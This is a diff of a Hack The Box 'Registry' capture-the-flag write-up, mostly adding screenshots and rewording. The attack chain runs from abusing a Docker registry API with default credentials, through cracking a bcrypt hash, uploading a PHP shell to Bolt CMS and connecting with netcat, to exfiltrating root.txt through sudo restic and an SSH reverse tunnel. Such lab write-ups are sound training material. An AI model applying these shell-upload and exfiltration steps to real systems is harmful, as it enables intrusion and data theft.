@@ -206,8 +206,17 @@ TCP 80 is accessible as well as TCP 443. TCP 443's certificate gives us some goo
 | PEyspHOCbg1C6a0gI1xo0c0=
 |_-----END CERTIFICATE-----
 ```
+TCP80 doesn't give me much other that default webserver information:
 
-Let's try to enumerate the directories, but first let's add this into the hosts file as well.
+![Registry_TCP80](/images/Registry_TCP80.png)
+
+BUT TCP443, as mentioned above gave us the certificate information, and a blank page:
+
+![Registry_TCP443](/images/Registry_TCP443.png)
+
+
+
+Let's try to enumerate the directories going straight to *HTTPS* (TCP443), but first let's add this into the hosts file as well.
 
 
 ### GOBUSTER
@@ -240,9 +249,13 @@ After running gobuster, we found a /v2 directory, which seems to be related to d
 
 When trying it on the browser it prompts for authentication which seems to be using a default admin:admin credentials but only a empty json response comes up.
 
+![Registry_DockerV2](/images/Registry_DockerV2.png)
+
+![Registry_DockerV2-2](/images/Registry_DockerV2-2.png)
+
 Looks like we need to do some research on Docker APIs and there is also a good document available on how to hack on Docker APIs and interact with them (see the resources provided).
 
-After interacting with Docker API a little, we find the repositories, tags, and  list of blobs which are important.
+After interacting with *Docker API* a little, we find the repositories, tags, and list of blobs which are important. For this, instead of using the browser, I used curl to see what was available but in a textual format and to possibly determine what I can do with it (*scripting?!*)
 
 ```
 kali@back0ff:~/Documents/HTB-Labs/Registry$ curl -v -X GET -k https://docker.registry.htb/v2/_catalog --basic --user admin:admin
@@ -346,7 +359,7 @@ Note: Unnecessary use of -X or --request, GET is already inferred.
 * Connection #0 to host docker.registry.htb left intact
 ```
 
-As the Repository and Tags seems to be bolt-image and latest, let's try pulling a list of Blobs and see what's in there.
+As the Repository and Tags seems to be *bolt-image* and *latest*, let's try pulling a list of Blobs and see what's in there.
 ```
 kali@back0ff:~/Documents/HTB-Labs/Registry$ curl -v -X GET -k https://docker.registry.htb/v2/bolt-image/manifests/latest --basic --user admin:admin
 Note: Unnecessary use of -X or --request, GET is already inferred.
@@ -616,7 +629,7 @@ bolt@bolt:~$ find /var -type f -perm -o=r 2> /dev/null
 /var/backups/bolt.tgz
 ```
 
-These files look like quite something and by looking at the changelog.md, we find Bolt related to Bolt CMS and its database uses SQLITE where it's stored in bolt/app/database/bolt.db.
+These files look like quite something and by looking at the changelog.md, we find Bolt related to Bolt CMS and its database uses SQLITE and stored in bolt/app/database/bolt.db.
 
 The first lines gives us the version of Bolt so we can look at some exploits if needed, but we need to also move bolt.db locally to use SQLite Browser and find out what is in there
 ```
@@ -636,12 +649,19 @@ kali@back0ff:~/Documents/HTB-Labs/Registry$ scp -i /home/kali/Documents/HTB-Labs
 ```
 Once you retrieve it, open it locally SQLite Browser, try and see what items of interest like the users table could be found and if any create a new file containing the credentials found: sqlite_hash.lst.
 
+![Registry_SQLite](/images/Registry_SQLite.png)
+
+![Registry_SQLite_users](/images/Registry_SQLite_users.png)
+
+See below the content of the file where I copied this hash along with this user:
+
 ```
 kali@back0ff:~/Documents/HTB-Labs/Registry$ cat sqlite_hash.lst 
 admin:$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK
 ```
 
 At this point, we should try and crack these credentials using JohnTheRipper:
+
 ```
 kali@back0ff:~/Documents/HTB-Labs/Registry$ john --wordlist=/usr/share/wordlists/rockyou.txt sqlite_hash.lst > sqlite_creds.txt 
 Created directory: /home/kali/.john
@@ -656,9 +676,11 @@ Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
 Cost 1 (iteration count) is 1024 for all loaded hashes
 strawberry       (admin)
 ```
-**WOOT WOOT! We have now credentials to access Bolt CMS.**
+
+WOOT WOOT! We have now credentials to access Bolt CMS. The credentials are **admin:strawberry**.
 
 Let's try and enumerate web directories and php files so we can't find out how to access BOLT CMS from this box.
+
 ```
 kali@back0ff:~/Documents/HTB-Labs/Registry$ gobuster dir -u http://registry.htb/bolt/ -w /usr/share/wordlists/dirb/big.txt -k -t 50 --timeout 20s -x php --wildcard
 ===============================================================
@@ -689,6 +711,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 2020/03/24 22:19:27 Finished
 ===============================================================
 ```
+
 The *index.php* page should give us (possibly) a login page. This doesn't give us much, but as BOLT CMS is deployed under /var/www/html/bolt, it is possible we are looking at this incorrectly. Looking at BOLT CMS documentation, the login should be under /bolt, but it isn't the case. Let's do a test:
 
 ```
@@ -759,9 +782,23 @@ kali@back0ff:~/Documents/HTB-Labs/Registry$
 
 My guess was right so let's access the CMS through the browser.
 
+![Registry_BoltLogin](/images/Registry_BoltLogin.png)
+
+![Registry_BoltLoggedIn](/images/Registry_BoltLoggedIn.png)
+
+
 While looking briefly in the CMS, I noticed File Management is up. After doing some check-ups we notice php files cannot be uploaded, and anything we upload normally goes away (gets deleted) very quickly, but if we upload any files as templates, they stay in perfectly.
 
-One place to check is the configuration (Main Configuration), we can find that the file extensions to upload can be modified (**line 240**), so we can add php and in a different tab, we can refresh (Ctrl+F5) twice and upload a simple shell by opening a port we can bind to, and in another tab access this shell. The sample shell to use is:
+![Registry_BoltThemes](/images/Registry_BoltThemes.png)
+
+One place to check is the configuration (Main Configuration), we can find that the file extensions to upload can be modified (**line 240**), so we can add php and in a different tab
+
+![Registry_BoltConfig](/images/Registry_BoltConfig.png)
+
+We can then refresh (Ctrl+F5) twice and upload a simple shell by opening a port we can bind to, and in another tab access this shell.
+
+The sample shell to use is:
+
 ```
 rce2.php:
 <?php
@@ -769,11 +806,12 @@ rce2.php:
 ?>
 ```
 
-**From testing, it's worth noting that outbound communication is restricted. Let's keep this in mind.
+**NOTE:** From testing, it's worth noting that outbound communication is restricted. Let's keep this in mind.
 
-Add the php file extension, upload the rce2.php file and quickly run netcat to registry.htb on port TCP4444 in a **NEW** terminal windows and try to connect.
+After adding the php file extension to in the main configuration, as explained above, and uploading the rce2.php file as a theme to then load it in the browser, let's quickly run netcat to registry.htb on port TCP4444 in a **NEW** terminal windows and try to connect.
 
 When connecting:
+
 ```
 kali@back0ff:~/Documents/HTB-Labs/Registry$ nc -v registry.htb 4444
 Ncat: Version 7.80 ( https://nmap.org/ncat )
@@ -786,7 +824,8 @@ python -c 'import pty;pty.spawn("/bin/bash")'
 www-data@bolt:~/html/bolt/theme$ 
 ```
 
-Let's run *sudo -l* to check on what we can run as sudo:
+Let's run *sudo -l* to check on what we can run as *sudo*:
+
 ```
 www-data@bolt:~/html/bolt/theme$ sudo -l
 sudo -l
@@ -798,6 +837,8 @@ User www-data may run the following commands on bolt:
     (root) NOPASSWD: /usr/bin/restic backup -r rest*
 www-data@bolt:~/html/bolt/theme$ 
 ```
+
+
 ## Data Exfiltration
 
 Something else we need to look at, restic for backups. While looking into this, we found out we must set a restic server locally and initialize the repository (see the resources section).
@@ -805,6 +846,7 @@ Something else we need to look at, restic for backups. While looking into this, 
 This whole process tells me one way we can approach this is by "exfiltrating data" from registry.htb. We can't do anything else here other than running the restic backup command on anything.
 
 Let's setup the restic server (*rest-server*) in a separate terminal window, locally:
+
 ```
 kali@back0ff:~/Documents/HTB-Labs/Registry$ rest-server --listen 0.0.0.0:8000 --path /home/kali/Documents/HTB-Labs/Registry --no-auth
 Data directory: /home/kali/Documents/HTB-Labs/Registry
@@ -826,10 +868,13 @@ Having done this, if we try to run the backup command, we cannot connect to the 
 
 At this point, we could also attempt to do SSH Remote Port Forwarding to bind a new service to registry.htb from a **NEW** terminal window:
 
-**SYNTAX:** 
+**SYNTAX:**
+
 ```ssh -R RemotePort:localhost:RestPort -i bolt_id_rsa bolt@registry.htb```
 
+
 Let's move forward and try this:
+
 ```
 kali@back0ff:~/Documents/HTB-Labs/Registry$ ssh -R 61234:localhost:8000 -i /home/kali/Documents/HTB-Labs/Registry/2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791/root/.ssh/id_rsa bolt@registry.htb
 
@@ -848,6 +893,7 @@ bolt@bolt:~$
 ```
 
 Before we do anything let's check on what registry.htb is listening to as remote port forwarding will open TCP 61234 through SSH which is allowed.
+
 ```
 bolt@bolt:~$ netstat -antpl
 (Not all processes could be identified, non-owned process info
@@ -868,7 +914,9 @@ tcp6       0      0 :::22                   :::*                    LISTEN      
 tcp6       0      0 :::80                   :::*                    LISTEN      -                   
 tcp6       0      0 ::1:61234               :::*                    LISTEN      -                   
 ```
-As TCP 61234 is now being used by registry.htb, rest-server is running on TCP 8000 on the localhost, let try and run restic from registry.htb as www-data and try to exfiltrate the root.txt file using the port opened previous through SSH Remote Port Forwarding.
+
+As TCP 61234 is now being used by registry.htb, rest-server is running on TCP 8000 on my localhost, let's try and run restic from registry.htb as www-data and try to exfiltrate the root.txt file using the port opened previously through SSH Remote Port Forwarding.
+
 ```
 www-data@bolt:~/html/bolt/theme$ sudo /usr/bin/restic backup -r rest:http://127.0.0.1:61234/ /root/root.txt
 <ckup -r rest:http://127.0.0.1:61234/ /root/root.txt
@@ -887,6 +935,7 @@ www-data@bolt:~/html/bolt/theme$
 **AND we were successful at this, but not done yet!**
 
 After doing all this, we now need to restore the "backup" of the root.txt file locally so we can access the root flag.
+
 ```
 kali@back0ff:~/Documents/HTB-Labs/Registry$ restic restore 3a378c88 -r rest:http://127.0.0.1:8000 --target .
 enter password for repository: 
@@ -895,4 +944,7 @@ restoring <Snapshot 3a378c88 of [/root/root.txt] at 2020-03-11 01:18:58.99186681
 kali@back0ff:~/Documents/HTB-Labs/Registry$ cat root.txt 
 ntrkz**********************kztgw
 ```
+
 **AND WE GOT THE ROOT FLAG!!**
+
+
